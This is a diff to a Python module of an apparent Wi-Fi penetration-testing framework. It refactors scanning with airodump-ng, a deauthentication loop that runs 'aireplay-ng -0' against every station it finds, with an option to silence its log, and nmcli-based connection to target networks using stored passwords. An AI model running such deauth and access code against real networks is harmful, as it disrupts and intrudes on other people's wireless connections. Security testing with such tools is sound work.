@@ -3,7 +3,10 @@ import re
 from time import time
 
 
-__all__ = ["DeauthMixin", "ScanMixin", "WPAConnectMixin", "STATION_REGEX"]
+__all__ = ["DeauthMixin", "ScanMixin", "WifiConnectMixin", "STATION_REGEX"]
+
+CONNECT_REGEX = re.compile(r"(?m)Device '(?P<iface>[a-z][a-z0-9]*)' success"
+                           r"fully activated with '(?P<uid>[0-9a-f\-]+)'\.")
 
 STATION_REGEX = re.compile(r"^\s*(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
                            r"(?P<station>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
@@ -21,14 +24,14 @@ TARGET_REGEX = re.compile(r"^\s*(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
                           r"(?P<auth>\w+)\s+"
                           r"(?P<essid>[\w\-\.]+)\s*$")
 
-CONNECT_REGEX = re.compile(r"(?m)Device '(?P<iface>[a-z][a-z0-9]*)' success"
-                           r"fully activated with '(?P<uid>[0-9a-f\-]+)'\.")
-
 
 class DeauthMixin(object):
     """ Mixin class for adding a .deauth() method """
+    requirements = {'system': ["aircrack-ng/aireplay-ng",
+                               "aircrack-ng/airodump-ng"]}
+
     def deauth(self, bssid, station=None, n_packets=5, interval=0, timeout=None,
-               capture=None, post_func=None):
+               capture=None, post_func=None, silent=False):
         t = self.console.state['TARGETS']
         try:
             k = self.config.option('ESSID').value
@@ -43,15 +46,19 @@ class DeauthMixin(object):
         i = 0
         try:
             for line in self.console._jobs.run_iter(cmd, timeout=timeout):
-                self.logger.debug(line)
                 m = STATION_REGEX.search(line)
                 # deauthenticate any station found
                 if m is not None:
                     s = m.group("station")
+                    # do not self-deauth
+                    if s in self.console.root.self_mac_addresses:
+                        continue
                     if station is None or station == s:
                         tr.setdefault(s, 0)
                         if interval == 0 or time() - tr[s] > interval:
-                            self.logger.warning("Deauth station: {}".format(s))
+                            if not silent:
+                                self.logger.warning("Deauth station: {}"
+                                                    .format(s))
                             cmd = "sudo aireplay-ng -0 {} -a {} -c {} {}" \
                                   .format(n_packets, bssid, s, iface)
                             self.console._jobs.background(cmd, subpool="deauth")
@@ -72,10 +79,14 @@ class DeauthMixin(object):
 
 class ScanMixin(object):
     """ Mixin class for use with Command and Module """
-    def run(self, interface, timeout=300):
-        self.logger.warning("Press Ctrl+C to interrupt")
+    requirements = {'system': ["aircrack-ng/airodump-ng"]}
+
+    def scan(self, interface, timeout=300, silent=False):
+        if not silent:
+            self.logger.warning("Press Ctrl+C to interrupt")
         s = self.console.state['STATIONS']
         t = self.console.state['TARGETS']
+        p = self.console.state['PASSWORDS']
         s.unlock()
         t.unlock()
         cmd = "sudo airodump-ng {}".format(interface)
@@ -90,17 +101,16 @@ class ScanMixin(object):
                               "cipher", "auth"]:
                         v = m.group(k)
                         data[k] = int(v) if v.isdigit() else v
-                    data['password'] = None
-                    data['connected'] = False
-                    data['stations'] = []
                     e = data['essid']
+                    data['password'] = p.get(e)
+                    data['stations'] = []
                     if self._filter_func(e):
                         if e not in t.keys():
                             self.logger.info("Found {}".format(e))
                         else:
                             # when updating, do not forget to copy previous
                             #  extra information
-                            for k in ['password', 'connected', 'stations']:
+                            for k in ['password', 'stations']:
                                 data[k] = t[e].get(k)
                         t[e] = data
                 # parse client-related line for its MAC address
@@ -111,6 +121,8 @@ class ScanMixin(object):
                     if len(e) == 1:
                         e = e[0]
                         sta = m.group("station")
+                        if sta in self.console.root.self_mac_addresses:
+                            continue
                         if sta not in t[e]['stations']:
                             # first remove from the list of stations for the old
                             #  ESSID
@@ -126,15 +138,34 @@ class ScanMixin(object):
             t.lock()
 
 
-class WPAConnectMixin(object):
+class WifiConnectMixin(object):
     """ Mixin class for use with Command and Module """
-    def run(self, essid):
+    requirements = {'system': ["nmcli"]}
+
+    def connect(self, essid, retry=True):
         password = self.console.state['TARGETS'][essid]['password']
         out = self.console._jobs.run(["nmcli", "device", "wifi", "connect",
                                       essid, "password", password])[0]
-        self.logger.debug(out)
+        if "Error: NetworkManager is not running." in out:
+            if retry:
+                self.restart_network_manager()
+                return self.connect(essid, False)
+            else:
+                raise Exception("Network Manager is not running")
         m = CONNECT_REGEX.search(out)
         if m is not None:
-            self.console._jobs.run(["dhclient", m.group("iface")])
-            return True
-        return False
+            iface = m.group("iface")
+            self.console._jobs.run(["dhclient", iface])
+            return iface
+        
+    def disconnect(self, essid=None):
+        for iface, data in self.console.state['INTERFACES'].items():
+            if essid is not None and data[1] != essid:
+                continue
+            out = self.console._jobs.run(["nmcli", "device", "disconnect",
+                                          "iface", iface])[0]
+            yield essid, "successfully disconnected." in out
+        self.console.root.interfaces
+    
+    def restart_network_manager(self):
+        self.console._jobs.run("service network-manager restart")
